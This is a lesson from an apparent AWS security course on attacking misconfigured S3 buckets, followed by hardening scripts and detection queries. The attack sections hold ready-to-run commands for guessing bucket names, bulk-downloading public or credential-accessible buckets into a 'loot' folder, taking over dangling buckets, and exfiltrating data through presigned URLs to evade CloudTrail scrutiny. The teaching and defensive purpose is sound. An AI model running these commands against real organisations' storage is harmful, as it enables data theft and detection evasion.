# 🪣 S3 Misconfiguration Attacks — Enumeration to Exfiltration

> **Phase 4 · Document 25 of 29**  
> **Estimated cost:** Free · **Estimated time:** 60–90 minutes  
> **Prerequisites:** `04-s3-buckets-and-policies.md`, `22-cloudgoat-lab-setup.md`  
> ⚠️ **Only test against buckets you own**

---

## Why S3 Is the Most Attacked AWS Service

S3 is the most commonly misconfigured AWS service and the most common source of large-scale data breaches. Billions of records have been exposed through S3 misconfigurations.

```
Common breach causes:
  40% — Publicly accessible buckets
  25% — Overly permissive bucket policies
  20% — Misconfigured ACLs
  15% — Compromised IAM credentials with S3 access
```

---

## Attack Phase 1 — Bucket Discovery

### Method 1 — Brute force common naming patterns

Organizations follow predictable bucket naming conventions:

```bash
# Common patterns
COMPANY="targetcompany"
PATTERNS=(
  "$COMPANY"
  "$COMPANY-backup"
  "$COMPANY-backups"
  "$COMPANY-logs"
  "$COMPANY-data"
  "$COMPANY-dev"
  "$COMPANY-staging"
  "$COMPANY-prod"
  "$COMPANY-assets"
  "$COMPANY-static"
  "$COMPANY-uploads"
  "$COMPANY-media"
  "$COMPANY-files"
  "backup-$COMPANY"
  "logs-$COMPANY"
  "${COMPANY}prod"
  "${COMPANY}dev"
  "${COMPANY}123"
)

for BUCKET in "${PATTERNS[@]}"; do
  # Check if bucket exists (HTTP HEAD request)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://s3.amazonaws.com/$BUCKET")
  
  if [ "$STATUS" != "403" ] && [ "$STATUS" != "000" ]; then
    echo "Found bucket: $BUCKET (HTTP $STATUS)"
  fi
done
```

HTTP response codes:
- `200` or `ListBucketResult` in body → bucket exists and is PUBLIC
- `403 Access Denied` → bucket exists but is PRIVATE (still useful intel)
- `404 NoSuchBucket` → bucket does not exist

### Method 2 — Source code and JavaScript analysis

Web applications often expose bucket names in JavaScript files:

```bash
# Download target website's JavaScript
wget -r -l2 -A.js https://targetcompany.com/

# Search for S3 bucket references
grep -r "s3.amazonaws.com\|s3://" ./*.js
grep -r "amazonaws.com" ./*.js | grep -v ".min.js"

# Search for bucket patterns in all files
find . -type f -exec grep -l "s3.amazonaws.com\|S3_BUCKET\|AWS_BUCKET" {} \;
```

### Method 3 — Certificate transparency logs

```bash
# Search crt.sh for subdomains that might be S3 buckets
curl -s "https://crt.sh/?q=%.targetcompany.com&output=json" | \
  jq '.[].name_value' | grep -E "s3|backup|assets|media|static"
```

### Method 4 — DNS enumeration

```bash
# S3 bucket URLs resolve to AWS IPs when they exist
nslookup targetcompany-backup.s3.amazonaws.com
# If it resolves → bucket exists (may be public or private)
# If NXDOMAIN → bucket does not exist
```

---

## Attack Phase 2 — Enumerate Public Buckets

```bash
# Check if bucket allows public listing
aws s3 ls s3://target-bucket --no-sign-request

# Download all public content
aws s3 sync s3://target-bucket ./ --no-sign-request

# Check the bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request 2>/dev/null

# Get the bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request 2>/dev/null
```

`--no-sign-request` sends unauthenticated requests — this tests truly public access.

### What to look for in public buckets

```bash
# Backup files
aws s3 ls s3://target-bucket --recursive --no-sign-request | grep -E "\.(sql|bak|tar|zip|gz)$"

# Credentials
aws s3 ls s3://target-bucket --recursive --no-sign-request | grep -E "\.(env|pem|key|cfg|conf|config)$"

# Database dumps
aws s3 ls s3://target-bucket --recursive --no-sign-request | grep -iE "(dump|backup|export|database)"

# Source code
aws s3 ls s3://target-bucket --recursive --no-sign-request | grep -E "\.(py|js|php|rb|go|java)$"
```

---

## Attack Phase 3 — Authenticated Bucket Attacks

With compromised IAM credentials, expand the attack:

```bash
# List all buckets the identity can see
aws s3 ls

# List contents of each bucket
for BUCKET in $(aws s3 ls | awk '{print $3}'); do
  echo "=== $BUCKET ==="
  aws s3 ls s3://$BUCKET --recursive 2>/dev/null | head -20
done

# Download everything from accessible buckets
aws s3 sync s3://target-bucket ./loot/ 2>/dev/null

# Check bucket replication settings (find other buckets)
aws s3api get-bucket-replication --bucket target-bucket 2>/dev/null

# Check lifecycle policies (understand data retention)
aws s3api get-bucket-lifecycle-configuration --bucket target-bucket 2>/dev/null
```

---

## Attack Phase 4 — Bucket Policy Misconfigurations

### Misconfiguration 1 — Wildcard Principal

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
```

`Principal: "*"` means everyone, including unauthenticated users. This exposes all objects publicly.

### Misconfiguration 2 — Cross-account access without conditions

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::OTHER-ACCOUNT-ID:root"
    },
    "Action": "s3:*",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
```

Granting `s3:*` to another account's root is essentially granting full access to that entire account.

### Misconfiguration 3 — Confused deputy (no condition on assumed role)

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Service": "ec2.amazonaws.com"
    },
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
```

Allows any EC2 service call — but should be scoped to a specific role ARN.

---

## Attack Phase 5 — Bucket Takeover

Bucket takeover occurs when a DNS record points to an S3 bucket that no longer exists — an attacker can create a bucket with the same name and serve malicious content.

```bash
# Find dangling CNAME records pointing to S3
# (in bug bounty scope only)
dig CNAME assets.targetcompany.com
# Returns: targetcompany-assets.s3.amazonaws.com

# Check if the bucket exists
curl -s -o /dev/null -w "%{http_code}" \
  https://targetcompany-assets.s3.amazonaws.com
# 404 NoSuchBucket → VULNERABLE to takeover

# Register the bucket
aws s3 mb s3://targetcompany-assets --region us-east-1

# Upload proof-of-concept
echo "Bucket takeover PoC" > index.html
aws s3 cp index.html s3://targetcompany-assets/

# Set public access for the PoC
aws s3api put-bucket-acl \
  --bucket targetcompany-assets \
  --acl public-read
```

> **For bug bounty and ethical research only.** Always report and then clean up immediately. Never use for malicious purposes.

---

## Attack Phase 6 — Presigned URL Abuse

With S3 read access, generate presigned URLs to exfiltrate data without triggering access log alerts (requests appear as coming from your IAM identity, not an unusual IP):

```bash
# Generate presigned URLs for all objects in a bucket
aws s3 ls s3://target-bucket --recursive | awk '{print $4}' | while read KEY; do
  URL=$(aws s3 presign s3://target-bucket/$KEY --expires-in 3600)
  echo "$KEY → $URL"
done > presigned-urls.txt

# Now use curl from any machine (no AWS credentials needed)
while IFS='→' read -r key url; do
  curl -s "$url" -o "./exfil/$(basename $key)"
done < presigned-urls.txt
```

The access appears as your legitimate IAM identity in CloudTrail — not the external download.

---

## S3 Attack Tool — S3Scanner

```bash
# Install S3Scanner
pip3 install s3scanner

# Scan a list of bucket names
cat > buckets.txt << 'EOF'
targetcompany
targetcompany-backup
targetcompany-logs
targetcompany-dev
EOF

s3scanner --buckets-file buckets.txt

# Dump public buckets
s3scanner --buckets-file buckets.txt --dump
```

---

## Defensive Hardening Against All These Attacks

### S3 Security Baseline Script

```bash
#!/bin/bash
# Apply security baseline to all S3 buckets in the account

BUCKETS=$(aws s3api list-buckets --query 'Buckets[*].Name' --output text)

for BUCKET in $BUCKETS; do
  echo "Hardening: $BUCKET"
  
  # 1. Block all public access
  aws s3api put-public-access-block \
    --bucket $BUCKET \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
  
  # 2. Enable versioning
  aws s3api put-bucket-versioning \
    --bucket $BUCKET \
    --versioning-configuration Status=Enabled
  
  # 3. Enable default encryption
  aws s3api put-bucket-encryption \
    --bucket $BUCKET \
    --server-side-encryption-configuration '{
      "Rules": [{
        "ApplyServerSideEncryptionByDefault": {
          "SSEAlgorithm": "aws:kms"
        },
        "BucketKeyEnabled": true
      }]
    }'
  
  # 4. Enforce HTTPS only
  aws s3api put-bucket-policy \
    --bucket $BUCKET \
    --policy "{
      \"Version\": \"2012-10-17\",
      \"Statement\": [{
        \"Sid\": \"DenyHTTP\",
        \"Effect\": \"Deny\",
        \"Principal\": \"*\",
        \"Action\": \"s3:*\",
        \"Resource\": [
          \"arn:aws:s3:::$BUCKET\",
          \"arn:aws:s3:::$BUCKET/*\"
        ],
        \"Condition\": {
          \"Bool\": {\"aws:SecureTransport\": \"false\"}
        }
      }]
    }" 2>/dev/null
  
  echo "  ✓ Hardened $BUCKET"
done

echo "Done. All buckets hardened."
```

---

## S3 Attack Detection Queries

```sql
-- Detect public bucket enumeration (ListBucket from many IPs)
fields sourceIPAddress, requestParameters.bucketName
| filter eventName = "ListBucket"
| filter errorCode = "AccessDenied"
| stats count_distinct(requestParameters.bucketName) as bucketsProbed by sourceIPAddress
| filter bucketsProbed > 5
| sort bucketsProbed desc

-- Detect mass object download
fields userIdentity.userName, requestParameters.bucketName
| filter eventName = "GetObject"
| stats count(*) as downloads by userIdentity.userName, requestParameters.bucketName
| filter downloads > 100
| sort downloads desc

-- Detect bucket policy changes
fields eventTime, userIdentity.userName, requestParameters.bucketName
| filter eventName in ["PutBucketPolicy", "DeleteBucketPolicy",
                        "PutBucketAcl", "DeletePublicAccessBlock"]
| sort eventTime desc
```

---

## S3 Misconfiguration Checklist

```
For every S3 bucket:
  [ ] Block Public Access: all 4 settings ON
  [ ] Bucket policy: HTTPS-only enforcement
  [ ] Default encryption: SSE-KMS with your CMK
  [ ] Versioning: Enabled
  [ ] Server access logging: Enabled to dedicated log bucket
  [ ] Lifecycle policy: Configured for data retention requirements
  [ ] No wildcard Principal (*) in bucket policy
  [ ] No cross-account access without ExternalId condition
  [ ] MFA Delete enabled (on critical buckets)
  [ ] Replication to separate account (for critical data)

Account-level:
  [ ] Block Public Access: all 4 settings ON at account level
  [ ] AWS Config: s3-bucket-public-read-prohibited rule active
  [ ] Macie: enabled and scanning all buckets
  [ ] Access Analyzer: enabled and no external access findings
```

---

## Phase 4 Progress Tracker

- [x] CloudGoat lab setup
- [x] IAM privilege escalation paths
- [x] IMDS attack and hardening
- [x] S3 misconfiguration attacks
- [ ] Pacu framework basics

---

*Phase 4 · AWS Cybersecurity & Digital Forensics Roadmap*
